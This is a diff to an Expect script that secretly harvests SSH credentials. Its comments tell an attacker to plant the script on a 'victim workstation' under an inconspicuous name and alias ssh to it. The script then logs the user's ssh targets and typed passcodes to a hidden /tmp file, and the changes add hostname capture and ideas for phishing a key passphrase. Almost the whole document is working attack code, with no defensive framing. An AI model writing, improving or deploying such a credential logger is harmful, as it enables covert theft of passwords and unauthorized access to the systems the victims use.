@@ -2,8 +2,8 @@
 
 # Steps:
 #
-# Copy this file and ssh_credlogger.sh to victim workstation, renamed to something less obvious
-# On victim workstation run alias ssh='./ssh_credlogger.expect 2>/dev/null'
+# Copy this file and ssh_stump.sh to victim workstation, renamed to something less obvious
+# On victim workstation run alias ssh="/path/to/this/file.expect 2>/dev/null"
 #     (the stderr redirect prevents a 10-line error message when the user exits ssh)
 # Ensure your alias links to the correct path for this file
 
@@ -16,6 +16,8 @@
 # interactive works, yay!
 # options work (like ssh -v, -l, user@host), yay!
 # Works if user gives wrong password either time
+# We get a list of all systems user SSH's to, so if they hit up git.dev, say, that might be useful to know
+#     we could then add to this script to ask for a passphrase
 
 set logfile /tmp/.data
 set timeout 40
@@ -24,6 +26,8 @@ set arg2 [lindex $argv 1];
 set arg3 [lindex $argv 2];
 set user [exec whoami]
 set date [exec date]
+set host [exec hostname]
+set logpath $logfile
 
 log_file $logfile
 send_log "\n\n$date\n"
@@ -31,7 +35,9 @@ send_log "ssh $arg1 $arg2 $arg3\n"
 send_log "user = $user\n"
 log_file
 
-spawn -noecho ~/ssh_credlogger.sh $arg1 $arg2 $arg3 
+set server "$arg1 $arg2 $arg3"
+
+spawn -noecho ~/ssh_stump.sh $user $server $host $logpath $arg1 $arg2 $arg3 
 
 expect "Password:*" 
     stty -echo
@@ -91,8 +97,9 @@ expect {
         send_log "2nd passcode = $passcode2\n"
         log_file }
 }
+
 interact
 
 # this interact works only if I run the script like
-# expect -f ./ssh_credlogger.expect (with target server hardcoded)
+# expect -f ./ssh_snoop2.expect (with bastion hardcoded)
 # Ahhh - expect script version 1 worked because .sh used instead of stdin
